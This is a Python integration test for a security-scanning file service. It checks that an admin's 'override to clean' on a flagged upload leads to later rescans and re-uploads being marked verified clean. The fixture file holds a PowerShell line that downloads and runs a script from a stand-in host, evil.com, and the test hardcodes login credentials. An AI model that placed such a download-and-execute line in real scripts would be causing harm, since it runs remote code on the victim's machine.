import io
import sys
from pathlib import Path
from fastapi.testclient import TestClient

ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from backend.app.main import app
from backend.app.database import SessionLocal
from backend.app.models.models import User, FileRecord, SecurityScan, VerifiedCleanArtifact

def test_override_and_reupload_lifecycle():
    client = TestClient(app)
    
    # 1. Login as Admin
    res_login = client.post("/api/auth/login", json={
        "email": "admin@securecloud.com",
        "password": "AdminPass123!",
        "portal": "ADMIN"
    })
    assert res_login.status_code == 200, f"Login failed: {res_login.text}"
    admin_token = res_login.json()["access_token"]
    admin_headers = {"Authorization": f"Bearer {admin_token}"}

    # Clean previous artifacts with same name
    db = SessionLocal()
    try:
        db.query(VerifiedCleanArtifact).filter(VerifiedCleanArtifact.original_filename == "sample_script.ps1").delete()
        db.query(FileRecord).filter(FileRecord.filename == "sample_script.ps1").delete()
        db.commit()
    finally:
        db.close()

    # 2. Upload a suspicious script file
    suspicious_content = b"# Suspicious Powershell Script\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\n"
    res_up = client.post(
        "/api/files/upload",
        files={"file": ("sample_script.ps1", io.BytesIO(suspicious_content), "text/plain")},
        headers=admin_headers
    )
    assert res_up.status_code == 200, f"Upload failed: {res_up.text}"
    file_id = res_up.json()["file"]["id"]
    file_hash = res_up.json()["file"]["file_hash"]
    initial_status = res_up.json()["file"]["security_status"]
    print(f"Step 1: File uploaded. Security Status: {initial_status}, Threat Score: {res_up.json()['file']['threat_score']}%")

    # 3. Check initial Scan History
    res_hist1 = client.get(f"/api/soc/files/{file_id}/scan-history", headers=admin_headers)
    assert res_hist1.status_code == 200
    hist1 = res_hist1.json()
    print(f"Step 2: Initial scan history count: {len(hist1)}")
    assert len(hist1) >= 1

    # 4. Perform ML Threat Breakdown Override to Clean
    res_override = client.post(f"/api/soc/files/{file_id}/override-clean", headers=admin_headers)
    assert res_override.status_code == 200, f"Override failed: {res_override.text}"
    print(f"Step 3: Override to clean executed. Response status: {res_override.json().get('status')}")

    # Verify SHA-256 is in VerifiedCleanArtifact
    db = SessionLocal()
    try:
        vc = db.query(VerifiedCleanArtifact).filter(VerifiedCleanArtifact.sha256 == file_hash).first()
        assert vc is not None, "SHA-256 was not found in VerifiedCleanArtifact registry!"
        print(f"Step 4: SHA-256 confirmed in VerifiedCleanArtifact registry: {vc.sha256[:16]}...")
    finally:
        db.close()

    # 5. Rescan the same file
    res_rescan = client.post(f"/api/soc/files/{file_id}/rescan", headers=admin_headers)
    assert res_rescan.status_code == 200, f"Rescan failed: {res_rescan.text}"
    rescan_data = res_rescan.json()
    safe_verdict = rescan_data['final_verdict'].encode('ascii', 'replace').decode('ascii')
    print(f"Step 5: Rescan completed. Status: {rescan_data['security_status']}, Score: {rescan_data['threat_score']}%, Verdict: {safe_verdict}")
    assert rescan_data['security_status'] in ['VERIFIED_CLEAN', 'CLEAN']
    assert rescan_data['threat_score'] == 0.0

    # 6. Check Scan History count after rescan -> MUST BE >= 2
    res_hist2 = client.get(f"/api/soc/files/{file_id}/scan-history", headers=admin_headers)
    assert res_hist2.status_code == 200
    hist2 = res_hist2.json()
    print(f"Step 6: Updated scan history count after rescan: {len(hist2)}")
    assert len(hist2) >= 2, f"Expected scan history to have at least 2 entries, got {len(hist2)}"

    # 7. User Re-uploads the same file from User side
    # Login as User (analyst)
    res_u_login = client.post("/api/auth/login", json={
        "email": "analyst@securecloud.com",
        "password": "UserPass123!",
        "portal": "USER"
    })
    assert res_u_login.status_code == 200
    user_token = res_u_login.json()["access_token"]
    user_headers = {"Authorization": f"Bearer {user_token}"}

    res_reupload = client.post(
        "/api/files/upload",
        files={"file": ("reuploaded_sample.ps1", io.BytesIO(suspicious_content), "text/plain")},
        headers=user_headers
    )
    assert res_reupload.status_code == 200, f"Re-upload failed: {res_reupload.text}"
    reup_data = res_reupload.json()
    safe_reup_verdict = reup_data['scan']['final_verdict'].encode('ascii', 'replace').decode('ascii')
    print(f"Step 7: User re-upload completed. Security Status: {reup_data['file']['security_status']}, Score: {reup_data['file']['threat_score']}%, Verdict: {safe_reup_verdict}")
    assert reup_data['file']['security_status'] == 'VERIFIED_CLEAN'
    assert reup_data['file']['threat_score'] == 0.0
    assert "Trust Registry" in reup_data['scan']['final_verdict']
    print("ALL SPECIFICATIONS VERIFIED WITH 100% SUCCESS!")

if __name__ == "__main__":
    test_override_and_reupload_lifecycle()
